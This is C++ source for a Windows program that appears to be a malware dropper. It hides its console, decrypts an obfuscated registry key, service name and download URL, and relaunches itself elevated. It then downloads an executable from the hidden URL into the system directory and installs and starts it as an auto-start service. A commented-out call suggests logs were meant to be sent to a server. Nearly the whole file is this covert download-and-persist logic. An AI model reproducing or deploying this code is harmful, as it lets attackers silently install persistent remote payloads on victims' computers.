// ConsoleApplication5.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "../tools/yeutility.h"
#include <windows.h>
#include "shlwapi.h"

#pragma comment(lib,"Shlwapi.lib")


int _tmain(int argc, LPTSTR argv[])
{
	SC_HANDLE hScm;
	SC_HANDLE hSc;
	TCHAR servPath[MAX_PATH] = { 0 };
	unsigned char enc_exename[] = { SERVICE_CRYPT_EXE },
		enc_sername[] = { SERVICE_CRYPT_NAME }, enc_regkey[] = { REG_SERVICE_CRYPT_KEY };
	TCHAR exeName[_MAX_FNAME], serName[_MAX_FNAME];
	LPCTSTR pErrMsg = 0;
	SERVICE_DESCRIPTION servDesc = { TEXT_SERVICE_DESC };
	FreeConsole();

	LONG reg_ret;
	HKEY hkey;
	TCHAR dec_key[_MAX_FNAME];
	if (!GetUnicDecrKey(enc_regkey, sizeof(enc_regkey), dec_key, sizeof(dec_key)))
		return 0;
	reg_ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		dec_key, 0, KEY_QUERY_VALUE, &hkey);

	if (reg_ret == ERROR_SUCCESS) return 0;
	else RegCloseKey(hkey);

	SHELLEXECUTEINFO seci = { sizeof(seci) };
	TCHAR modulePath[MAX_PATH];
	if (!GetModuleFileName(0, modulePath, sizeof(modulePath))) return 0;
	LPTSTR appName = PathFindFileName(modulePath);
	if (*appName == 0) return 0;
	CreateMutex(0, 0, appName);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return 0;

	seci.lpFile = modulePath;
	seci.lpVerb = TEXT("RUNAS");
	if (!ShellExecuteEx(&seci)) return 0;


	if (!InitLogs()) return 0;

	if (!GetUnicDecrKey(enc_exename, sizeof(enc_exename), exeName, sizeof(exeName)))
		return 0;

	if (!GetSystemWow64Directory(servPath, sizeof(servPath))){
		if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED && !GetSystemDirectory(servPath, sizeof(servPath)))
		{
			EventLogs(TEXT_CREATESERVICE_LOG2);
			return 0;
		}
	}

	PathCombine(servPath, servPath, exeName);

	unsigned char enc_servurl[] = { EXE_SERVICE_CRYPT_URL };
	TCHAR servUrl[_MAX_FNAME];
	if (!GetUnicDecrKey(enc_servurl, sizeof(enc_servurl), servUrl, sizeof(servUrl)))
		return 0;
	if (!DownLoadFile(servUrl, servPath))
	{
		EventLogs(TEXT_CREATESERVICE_LOG3);
		free(servUrl);
		return 0;
	}
	
	hScm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!hScm)
	{
		EventLogs(TEXT_CREATESERVICE_LOG4);
		return 0;
	}


	GetUnicDecrKey(enc_sername, sizeof(enc_sername), serName, sizeof(serName));

	hSc = CreateService(hScm, serName, serName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,//| SERVICE_INTERACTIVE_PROCESS
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
		servPath, NULL, NULL, NULL, NULL, NULL);
	if (hSc)
		EventLogs(TEXT_CREATESERVICE_LOG5);
	else{
		EventLogs(TEXT_CREATESERVICE_LOG6);
		return 0;
	}

	if (!ChangeServiceConfig2(hSc, SERVICE_CONFIG_DESCRIPTION, &servDesc))
		EventLogs(TEXT_CREATESERVICE_LOG7);



	if (StartService(hSc, 0, 0))
		EventLogs(TEXT_CREATESERVICE_LOG8);
	else{
		EventLogs(TEXT_CREATESERVICE_LOG9);
		DeleteService(hSc);
	}

	CloseLogs();
	CloseServiceHandle(hSc);
	CloseServiceHandle(hScm);
	//SendLogFileToServer();
	return 0;
}
